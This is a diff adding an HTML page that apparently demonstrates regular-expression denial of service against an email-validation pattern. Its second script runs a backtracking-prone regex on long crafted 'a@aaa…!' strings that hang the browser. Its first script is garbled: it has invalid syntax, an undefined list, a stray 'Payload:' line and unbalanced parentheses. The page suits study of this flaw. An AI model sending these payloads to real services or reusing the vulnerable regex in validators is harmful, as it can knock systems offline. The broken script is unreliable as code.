@@ -1,0 +1,45 @@
+<form>
+<input type="text" name="txt" />
+<input type="submit" onclick="exp(this.form.txt.value)" />
+</form>
+
+
+<script>
+
+function exp(target_str){
+    var eval_str 
+    s1 = new Date()
+    target_str.math(^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@(([0-9a-zA-Z])+([-\w]*[0-9a-zA-Z])*\.)+[a-zA-Z]{2,9})$
+Payload: a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!)
+    s2 = new Date()
+   document.write("Consuming time: " + (s2-s1))
+
+    for (evil_str in str_list)
+	{
+        	document.write("Current: " + evil_str)
+       	 	exp(evil_str)
+       	 	document.write(("--"*40)
+	}
+}
+
+</script>
+
+
+<script type="text/javascript"> 
+function isEmail(str){ 
+var reg = /^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@(([0-9a-zA-Z])+([-\w]*[0-9a-zA-Z])*\.)+[a-zA-Z]{2,9})$/; 
+return reg.test(str); 
+} 
+var str = 'a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'; 
+document.write(isEmail(str)+'<br />'); 
+var str2 = 'a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'; 
+document.write(isEmail(str2)+'<br />'); 
+var str3 = 'a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'; 
+document.write(isEmail(str3)+'<br />'); 
+var str4 = 'a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'; 
+document.write(isEmail(str4)+'<br />'); 
+var str5 = 'a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'; 
+document.write(isEmail(str5)+'<br />'); 
+</script> 
+
+
